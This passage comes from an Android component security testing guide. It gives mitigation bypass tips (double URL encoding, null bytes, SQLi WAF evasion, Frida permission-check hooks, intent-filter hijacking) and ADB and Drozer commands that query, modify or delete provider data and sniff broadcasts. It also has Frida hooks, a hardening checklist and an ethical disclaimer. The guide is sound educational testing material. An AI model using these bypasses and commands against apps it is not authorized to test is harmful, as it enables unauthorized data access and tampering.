□ Race condition testing with Frida/Turbo

✅ REPORTING
□ Document exact commands & output
□ Include impact assessment & CVSS score
□ Provide secure code examples
□ Verify fix in patched version
```

### 8.5 Mitigation Bypass Techniques
- **Signature permission bypass**: Use same debug keystore if app allows debug builds
- **Permission check bypass**: Hook `checkCallingOrSelfPermission()` with Frida
- **Path validation bypass**: Use `%2e%2e%2f` (double URL encode) or null bytes
- **SQLi WAF bypass**: Use `/**/` comments, hex encoding, or Unicode normalization
- **Intent filtering bypass**: Register higher priority intent-filter or use `android:priority="999"`

---

## 🔹 SECTION 9: QUICK REFERENCE CHEAT SHEETS

### 9.1 Component Comparison Matrix
| Feature | Activity | Service | Receiver | Provider |
|---------|----------|---------|----------|----------|
| **Exported** | `true`/`false` | `true`/`false` | `true`/`false` | `true`/`false` |
| **Invocation** | `startActivity()` | `startService()`/`bindService()` | `sendBroadcast()` | `ContentResolver.query()` |
| **Permission** | `android:permission` | `android:permission` | `android:permission` | `readPermission`/`writePermission` |
| **Common Attack** | Intent injection, deep link abuse | Command injection, binding abuse | Intent spoofing, data leakage | SQLi, path traversal, file disclosure |
| **Secure Default** | `exported="false"` | `exported="false"` | `exported="false"` | `exported="false"` |

### 9.2 ADB Command Quick Reference
```bash
# Enumerate
adb shell dumpsys package com.app | grep -E "activity|service|receiver|provider"

# Activities
adb shell am start -n com.app/.Act --es key val
adb shell am start -W -a android.intent.action.VIEW -d "scheme://host" com.app

# Services
adb shell am startservice -n com.app/.Svc --es key val

# Broadcasts
adb shell am broadcast -a com.app.ACTION --es key val

# Providers
adb shell content query --uri content://com.app.provider/table --where "1=1"
adb shell content insert --uri content://com.app.provider/table --bind name:s:test
adb shell content update --uri content://com.app.provider/table --bind status:s:active --where "id=1"
adb shell content delete --uri content://com.app.provider/table --where "id=1"
```

### 9.3 Drozer Command Quick Reference
```bash
dz> run app.package.attacksurface com.app
dz> run app.activity.info -a com.app
dz> run app.service.info -a com.app
dz> run app.receiver.info -a com.app
dz> run app.provider.info -a com.app
dz> run app.provider.query content://com.app.provider/table
dz> run app.provider.update content://com.app.provider/table --bind col:s:val --where "id=1"
dz> run app.broadcast.send --action com.app.ACTION --string key val
dz> run app.broadcast.sniff --action com.app.SENSITIVE
```

### 9.4 Frida Hook Templates
```javascript
// Hook intent creation
Java.perform(function() {
    var Intent = Java.use("android.content.Intent");
    Intent.$init.overload('java.lang.String').implementation = function(action) {
        console.log("[Intent] " + action);
        return this.$init(action);
    };
});

// Hook component methods
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload('android.content.Intent').implementation = function(i) {
        console.log("[Activity] " + i.getComponent().getClassName());
        return this.startActivity(i);
    };
});

// Hook provider query
Java.perform(function() {
    var Provider = Java.use("com.app.SecureProvider");
    Provider.query.implementation = function(uri, proj, sel, selArgs, sort) {
        console.log("[Provider] " + uri);
        return this.query(uri, proj, sel, selArgs, sort);
    };
});
```

### 9.5 Manifest Vulnerability Checklist
```
□ No sensitive components with android:exported="true"
□ All intent-filters have explicit android:exported="false" if not needed externally
□ android:permission set on sensitive components
□ No mutable PendingIntents (use FLAG_IMMUTABLE)
□ Content providers use parameterized queries
□ File providers use strict path validation
□ Deep links validate redirect parameters
□ Broadcast receivers use LocalBroadcastManager or signature permissions
```

### 9.6 Exploitation Flowchart
```
Start → Extract APK → Analyze Manifest → Identify Exported Components
   ↓
Test Activities → Intent Extras → Deep Links → Auth Bypass? → Yes: Report
   ↓
Test Services → StartService → BindService → Command Injection? → Yes: Report
   ↓
Test Receivers → SendBroadcast → Spoof Intent → Data Leak? → Yes: Report
   ↓
Test Providers → Query/Insert → SQLi/Path Traversal → File Read? → Yes: Report
   ↓
Chain Components → Intent Relaying → PendingIntent → Privilege Escalation? → Yes: Report
   ↓
Document → Verify → Submit → Track Fix
```

---

## 🔹 SECTION 10: REFERENCES & FURTHER LEARNING

### 📚 Official Documentation
- [Android Components Overview](https://developer.android.com/guide/components)
- [Android Manifest Reference](https://developer.android.com/guide/topics/manifest/manifest-intro)
- [Android Security Best Practices](https://source.android.com/docs/security/best-practices/apps)
- [PendingIntent Security](https://developer.android.com/reference/android/app/PendingIntent#FLAG_IMMUTABLE)

### 🎓 Learning Resources
- [OWASP Mobile Security Testing Guide (MSTG)](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Android Component Security](https://www.nowsecure.com/resources/android-app-security/)
- [Drozer Documentation](https://labs.f-secure.com/archive/tools/drozer/)
- [Frida Android Tutorial](https://frida.re/docs/android/)

### 🛠️ Tools
- [Drozer](https://github.com/FSecureLABS/drozer) - Component testing
- [Frida](https://frida.re/) - Dynamic instrumentation
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Automated analysis
- [jadx](https://github.com/skylot/jadx) - Java decompiler
- [Apktool](https://ibotpeaches.github.io/Apktool/) - Manifest/resource analysis

### 🧪 Practice Apps
- [InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2)
- [GoatDroid](https://github.com/jackMannino/GoatDroid)
- [DIVA (Damn Insecure and Vulnerable App)](https://github.com/payatu/diva-android)
- [Android-Insecure-App](https://github.com/payatu/Android-Insecure-App)

### 🗣️ Communities
- [OWASP Mobile Slack](https://owasp.org/slack/invite) #mobile channel
- [Reddit r/AndroidSecurity](https://reddit.com/r/AndroidSecurity)
- [Frida Discord](https://discord.gg/frida)
- [Twitter #MobileSecurity](https://twitter.com/search?q=%23MobileSecurity)

---

## ⚠️ ETHICAL DISCLAIMER

> 🔐 **This reference is for educational and authorized security testing purposes only.** 🔐
>
> By using this content, you agree to:
> - ✅ Only test systems you own or have **explicit written authorization** to assess
> - ✅ Follow all applicable local, national, and international laws
> - ✅ Practice **Responsible Disclosure** when discovering vulnerabilities
> - ✅ Never modify or distribute apps without permission from copyright holders
> - ✅ Respect user privacy and data protection regulations
>
> ❌ **DO NOT**:
> - ❌ Modify apps for piracy, cheating, or unauthorized access
> - ❌ Distribute repackaged apps with malicious payloads
> - ❌ Attack systems without permission
> - ❌ Use techniques to circumvent licensing for commercial gain
>
> *When in doubt: ASK FIRST. Get permission IN WRITING.*

